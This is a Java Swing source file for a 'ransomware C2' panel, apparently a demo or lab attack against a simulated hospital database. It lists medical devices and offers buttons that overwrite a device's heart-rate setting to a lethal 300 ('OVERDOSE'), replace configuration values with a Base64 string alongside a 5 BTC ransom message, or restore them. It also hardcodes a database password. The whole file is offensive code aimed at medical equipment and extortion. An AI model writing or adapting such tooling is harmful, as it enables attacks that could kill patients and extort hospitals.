import javax.swing.*;
import java.awt.*;
import java.sql.*;
import java.util.Base64;

public class RansomwareAgent extends JFrame {

    // --- CONFIGURATION ---
    private static final String DB_URL = "jdbc:postgresql://localhost:5432/smart_hospital_db";
    private static final String USER = "postgres";
    private static final String PASS = "varrie75"; // <--- UPDATE THIS

    private JComboBox<String> targetCombo;
    private JTextArea logArea;

    public RansomwareAgent() {
        setTitle("C2 SERVER // RANSOMWARE DEPLOYMENT");
        setSize(600, 450);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());
        getContentPane().setBackground(new Color(20, 0, 0)); // Evil Dark Red

        initDB();
        setupUI();
    }

    private void initDB() {
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            // Check connectivity
        } catch (SQLException e) {
            JOptionPane.showMessageDialog(this, "DB Error: " + e.getMessage());
        }
    }

    private void setupUI() {
        // Header
        JPanel header = new JPanel();
        header.setBackground(new Color(50, 0, 0));
        JLabel title = new JLabel("☠️ DEADLOCK RANSOMWARE SUITE");
        title.setFont(new Font("Chiller", Font.BOLD, 28)); // Or standard font
        title.setForeground(Color.RED);
        header.add(title);
        add(header, BorderLayout.NORTH);

        // Control Panel
        JPanel controls = new JPanel(new GridLayout(4, 1, 10, 10));
        controls.setBackground(new Color(20, 0, 0));
        controls.setBorder(BorderFactory.createEmptyBorder(20, 50, 20, 50));

        // Target Selector
        targetCombo = new JComboBox<>();
        loadTargets();
        controls.add(targetCombo);

        // Attack 1: Silent Kill (Modify Value)
        JButton btnLethal = new JButton("INJECT LETHAL CONFIG (OVERDOSE)");
        btnLethal.setBackground(Color.RED);
        btnLethal.setForeground(Color.WHITE);
        btnLethal.addActionListener(e -> executeAttack("LETHAL"));
        controls.add(btnLethal);

        // Attack 2: Encryption (Denial of Service)
        JButton btnEncrypt = new JButton("ENCRYPT DATA (LOCKOUT)");
        btnEncrypt.setBackground(Color.DARK_GRAY);
        btnEncrypt.setForeground(Color.WHITE);
        btnEncrypt.addActionListener(e -> executeAttack("ENCRYPT"));
        controls.add(btnEncrypt);

        // Restore
        JButton btnRestore = new JButton("DECRYPT / RESTORE (PAYMENT RECEIVED)");
        btnRestore.setBackground(Color.GREEN);
        btnRestore.setForeground(Color.BLACK);
        btnRestore.addActionListener(e -> executeAttack("RESTORE"));
        controls.add(btnRestore);

        add(controls, BorderLayout.CENTER);

        // Log
        logArea = new JTextArea(6, 40);
        logArea.setBackground(Color.BLACK);
        logArea.setForeground(Color.RED);
        add(new JScrollPane(logArea), BorderLayout.SOUTH);
    }

    private void loadTargets() {
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT device_uuid FROM medical_devices");
            while (rs.next()) {
                targetCombo.addItem(rs.getString("device_uuid"));
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void executeAttack(String type) {
        String target = (String) targetCombo.getSelectedItem();
        if (target == null) return;

        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {
            String sql = "UPDATE medical_devices SET config_value = ?, status_message = ? WHERE device_uuid = ?";
            PreparedStatement pstmt = conn.prepareStatement(sql);

            if (type.equals("LETHAL")) {
                // Change heart rate to 300 (Fibrillation)
                pstmt.setString(1, "300");
                pstmt.setString(2, "CRITICAL: PACING OVERRIDE");
                log("Executing LETHAL injection on " + target + "...");
            }
            else if (type.equals("ENCRYPT")) {
                // Simulate encryption (Base64 of random string)
                String payload = Base64.getEncoder().encodeToString("YOUR_FILES_ARE_ENCRYPTED".getBytes());
                pstmt.setString(1, payload); // This breaks the Python Float parser
                pstmt.setString(2, "LOCKED! PAY 5 BTC TO UNLOCK");
                log("Encrypting device " + target + "...");
            }
            else if (type.equals("RESTORE")) {
                // Restore to safe baseline
                pstmt.setString(1, "75");
                pstmt.setString(2, "OPERATIONAL");
                log("Restoring system " + target + "...");
            }

            pstmt.setString(3, target);
            pstmt.executeUpdate();
            log("ATTACK SUCCESSFUL. Payload Delivered.");

        } catch (Exception e) {
            log("Attack Failed: " + e.getMessage());
        }
    }

    private void log(String msg) {
        logArea.append("> " + msg + "\n");
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new RansomwareAgent().setVisible(true));
    }
}